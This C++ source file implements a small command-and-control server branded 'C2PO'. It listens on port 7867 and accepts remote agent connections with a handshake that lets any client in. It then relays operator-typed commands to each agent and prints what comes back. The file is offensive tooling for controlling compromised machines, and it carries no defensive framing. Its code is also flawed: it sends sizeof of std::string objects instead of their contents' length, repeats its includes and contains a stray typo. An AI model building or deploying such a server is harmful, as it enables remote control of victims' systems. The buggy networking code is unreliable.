#include <iostream>
#include <string>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <iostream>
#include <sstream>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdexcept>
#include <uuid/uuid.h>
#include <chrono>
#include <random>

using namespace std;

struct instructionSet { 
    int delay;
    char* command;
};

char sendBuffer[1024];

bool agentHandshake(int clientSocket) {
    // Client sends guid
    // We decide to accept, return true
    // We decide to deny, return false
    std::cout << "Receiving handshake from client..." << std::endl;
    char buffer[1024];
    ssize_t bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
    if (bytesRead == -1) {
        std::cerr << "Error reading from client socket" << std::endl;
        send(clientSocket, "nah\n", sizeof("nah\n"), 0);
        return false;
    } else if (bytesRead == 0) {
        std::cout << "Client disconnected" << std::endl;
        send(clientSocket, "nah\n", sizeof("nah\n"), 0);
        return false;
    } else {
        std::string clientRsp =  std::string(buffer, bytesRead);
        std::cout << "Received " << bytesRead << " bytes from client: " << clientRsp << std::endl;
        send(clientSocket, clientRsp.c_str(), sizeof(clientRsp), 0);
        return true;
    }
}

int main() {
    
    
    
    
    
    
    // std::cout << "----------------------------------------.-.------------------------" << std::endl;
    // std::cout << "-------------------------------------- (o o)-----------------------" << std::endl;
    // std::cout << "----------------------------------------\\=/------------------------" << std::endl;
    // std::cout << "------------------------------------- _--_--_----------------------" << std::endl;
    // std::cout << "-------------------------------------( /   \\ )---------------------" << std::endl;
    // std::cout << "-------------------------------------//\\___/\\\\--------------------" << std::endl;
    // std::cout << "-------------------------------------\\/   \\//---------------------" << std::endl;
    // std::cout << "---------------------------------------\\ V /-----------------------" << std::endl;
    // std::cout << "----------------------------------------(|)-----------------------" << std::endl;
    // std::cout << "---------------------------------------_|||_----------------------" << std::endl;
    // std::cout << "--------------------------------------'--'--'----------------------" << std::endl;
    std::cout << "         CCCCCCCCCCCCC 222222222222222    PPPPPPPPPPPPPPPPP        000000000     " << std::endl;
    std::cout << "       CCC::::::::::::C2:::::::::::::::22  P::::::::::::::::P     00:::::::::00   " << std::endl;
    std::cout << "     CC:::::::::::::::C2::::::222222:::::2 P::::::PPPPPP:::::P  00:::::::::::::00 " << std::endl;
    std::cout << "    C:::::CCCCCCCC::::C2222222     2:::::2 PP:::::P     P:::::P0:::::::000:::::::0" << std::endl;
    std::cout << "   C:::::C       CCCCCC            2:::::2   P::::P     P:::::P0::::::0   0::::::0" << std::endl;
    std::cout << "  C:::::C                          2:::::2   P::::P     P:::::P0:::::0     0:::::0" << std::endl;
    std::cout << "  C:::::C                       2222::::2    P::::PPPPPP:::::P 0:::::0     0:::::0" << std::endl;
    std::cout << "  C:::::C                  22222::::::22     P:::::::::::::PP  0:::::0 000 0:::::0" << std::endl;
    std::cout << "  C:::::C                22::::::::222       P::::PPPPPPPPP    0:::::0 000 0:::::0" << std::endl;
    std::cout << "  C:::::C               2:::::22222          P::::P            0:::::0     0:::::0" << std::endl;
    std::cout << "  C:::::C              2:::::2               P::::P            0:::::0     0:::::0" << std::endl;
    std::cout << "   C:::::C       CCCCCC2:::::2               P::::P            0::::::0   0::::::0" << std::endl;
    std::cout << "    C:::::CCCCCCCC::::C2:::::2       222222PP::::::PP          0:::::::000:::::::0" << std::endl;
    std::cout << "     CC:::::::::::::::C2::::::2222222:::::2P::::::::P           00:::::::::::::00 " << std::endl;
    std::cout << "       CCC::::::::::::C2::::::::::::::::::2P::::::::P             00:::::::::00   " << std::endl;
    std::cout << "          CCCCCCCCCCCCC22222222222222222222PPPPPPPPPP               000000000     " << std::endl;
    std::cout << "----------------------------------------------------------------------------------" << std::endl;
    std::cout << "-----------------------------------At-your-service!-------------------------------" << std::endl;
    std::cout << "----------------------------------------------------------------------------------" << std::endl;
    

    std::cout << "Listening for commands, at your service! " << std::endl;


    bool workingCurrentClient = false;
    std:;string payload;

    // Create a socket using the IPv4 address family, TCP protocol, and default protocol (0)
    int serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    bool attemptReceiveConnections = true;
    bool continueCurrentClient = false;
    
    // Create a server address structure
    struct sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = INADDR_ANY;
    serverAddress.sin_port = htons(7867);
    
    // Bind the server socket to the server address structure
    bind(serverSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress));
    
    // Listen for incoming connections on the server socket
    listen(serverSocket, 5);
    
    std::cout << "Server listening on port " << ntohs(serverAddress.sin_port) << std::endl;
    
    try {
        // Accept incoming connections and handle them
        while (attemptReceiveConnections) {
            struct sockaddr_in clientAddress;
            socklen_t clientAddressLength = sizeof(clientAddress);

            // Handle the client connection
            int clientSocket = accept(serverSocket, (struct sockaddr *)&clientAddress, &clientAddressLength);
            std::cout << "Accepted connection from " << inet_ntoa(clientAddress.sin_addr) << ":" << ntohs(clientAddress.sin_port) << std::endl;
            workingCurrentClient = true;
            // Accept initialization
            workingCurrentClient = agentHandshake(clientSocket);
            while (workingCurrentClient){
                
                if (!workingCurrentClient) break;

                sleep(3);
                // Continue relationship

                // Request payload from operator
                std::cout << "Command: ";
                std::cin >> payload;

                // Send payload
                send(clientSocket, payload.c_str(), sizeof(payload), 0);

                // Receive response
                char buffer[1024];
                ssize_t bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
                if (bytesRead == -1) {
                    std::cerr << "Error reading from client socket" << std::endl;
                    close(clientSocket);
                    break;
                } else if (bytesRead == 0) {
                    std::cout << "Client disconnected" << std::endl;
                    close(clientSocket);
                    break;
                } else {
                    std::string clientRsp =  std::string(buffer, bytesRead);
                    std::cout << "Response:\n\n" << clientRsp << std::endl;
                }

                // std::cout << "Closing socket to current client" << std::endl;
                // close(clientSocket);   

            }
            
        }
    }
    catch (exception e) {
        cout << "An error has occured.\n";
    }
    
    // Close the server socket
    close(serverSocket);
    
    return 0;
}